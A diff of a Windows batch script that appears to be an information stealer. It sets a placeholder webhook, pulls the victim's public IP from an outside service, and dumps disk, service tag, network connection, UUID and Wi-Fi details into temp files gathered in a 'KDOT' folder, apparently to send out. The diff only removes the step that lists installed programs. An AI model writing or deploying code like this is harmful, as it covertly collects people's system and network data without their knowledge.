@@ -3,7 +3,6 @@ cd /D "%~dp0%"
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 timeout 2 > nul
-powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -65,7 +64,6 @@ move %localappdata%\Temp\ip.txt %localappdata%\Temp\KDOT\ip.txt
 move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
 move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
 move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
-move %localappdata%\Temp\programms.txt %localappdata%\Temp\KDOT\programms.txt
 move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
 move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
 move %localappdata%\Temp\ipp.txt %localappdata%\Temp\KDOT\ipp.txt
